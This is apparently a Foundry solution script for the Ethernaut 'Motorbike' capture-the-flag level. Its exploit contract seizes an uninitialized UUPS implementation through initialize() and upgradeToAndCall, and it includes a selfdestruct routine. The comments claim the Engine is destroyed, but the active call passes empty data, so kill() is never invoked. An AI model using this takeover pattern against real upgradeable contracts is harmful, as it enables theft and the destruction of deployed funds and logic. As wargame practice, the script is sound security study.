// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "forge-std/Script.sol";
import {Motorbike, Engine} from "../src/levels/Motorbike.sol";

/*
    Solution script for the Ethernaut Level 25: Motorbike

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in MotorbikeScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Motorbike.s.sol:MotorbikeScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Motorbike.s.sol/11155111
*/

contract MotorbikeAttack {
    Engine target;
    constructor(address _target) public {
        target = Engine(_target);
    }

    function attack() external {
        target.initialize();
        // target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
        target.upgradeToAndCall(address(this), "");
    }

    function kill() external {
        /* 
            NOTE!! selfdestruct is depreciated since cancun hardfork so this will not actually delete the bytecode anymore!

            For an elaborate work around check this article on how to solve this acter the upgrades: 
            
            1. https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/?tab=readme-ov-file#the-solution-after-the-upgrade
            2. https://github.com/OpenZeppelin/ethernaut/issues/701
        */
        selfdestruct(payable(address(0)));
    }
}

contract MotorbikeScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0x239b7a1ad4066aBD303Dbb9e5C4089b9405E5A87);
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    // use vm.load cheatcode to get the implementation address for the Engine
    address engineAddress = address(uint160(uint256(
        vm.load(instance, _IMPLEMENTATION_SLOT)
    )));
    // set the Motorbike and Engine instnaces
    Motorbike level25 = Motorbike(instance);
    Engine engine = Engine(engineAddress);

    function run() external {
        vm.startBroadcast();

        // bytes memory horsePowerFunction = abi.encodeWithSignature("horsePower()", "");
        // (, bytes memory data) = instance.call(horsePowerFunction);
        // console.log(abi.decode(data, (uint256)));
        
        // deploy the attack contract and destroy the implementation (Engine)
        MotorbikeAttack attacker = new MotorbikeAttack(engineAddress);
        attacker.attack();

        vm.stopBroadcast();
    }
}